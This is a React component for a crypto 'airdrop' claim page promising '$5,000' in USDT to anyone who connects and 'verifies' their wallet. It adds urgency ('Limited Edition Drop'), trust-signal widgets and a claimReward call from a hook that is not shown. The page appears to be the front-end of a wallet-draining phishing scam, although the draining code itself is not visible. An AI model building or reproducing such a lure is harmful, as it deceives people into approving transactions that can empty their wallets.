import React, { useState } from 'react';
import { useClaim } from '../hooks/useClaim';
import { useWallet } from '../hooks/useWallet';
import { SuccessModal } from './Modals/SuccessModal';
import { TrustSignals } from './Claim/TrustSignals';
import { ClaimCard } from './Claim/ClaimCard';
import { StatsGrid } from './Claim/StatsGrid';
import { Star } from 'lucide-react';
import { Navbar } from './Layout/NavBar';
import { Background } from './Layout/Background';
import SelectModal from './Modals/SelectModal';

const Dr: React.FC = () => {
  const [isOpen, setIsOpen] = useState(false);
  const { provider, account, connectWallet, isConnecting } = useWallet();
  const { claimStatus, showSuccessModal, claimReward, setShowSuccessModal } =
    useClaim(
      provider,
      account,
      (txHash) => console.log('Transaction successful:', txHash),
      (error) => console.error('Claim error:', error),
    );

  return (
    <div className="app">
      <Background />
      <Navbar setIsOpen={setIsOpen} />

      <div className="hero-section">
        <div className="hero-badge">
          <Star size={14} />
          Limited Edition Drop
        </div>
        <h1 className="hero-title">
          Claim Your <span className="gradient-text">$5,000</span> Reward
        </h1>
        <p className="hero-subtitle">
          Exclusive airdrop for early supporters. Verify your wallet to receive
          5,000 USDT + bonus rewards.
        </p>

        <StatsGrid />
        <ClaimCard
          claimStatus={claimStatus}
          showSuccessModal={showSuccessModal}
          onClaim={claimReward}
          onConnect={connectWallet}
          isConnected={!!account}
          isConnecting={isConnecting}
          setIsOpen={setIsOpen}
        />

        <TrustSignals />
      </div>

      <SuccessModal
        isOpen={showSuccessModal}
        onClose={() => setShowSuccessModal(false)}
      />

      <SelectModal
        isOpen={isOpen}
        setIsOpen={setIsOpen}
        onConnect={connectWallet}
      />
    </div>
  );
};

export default Dr;
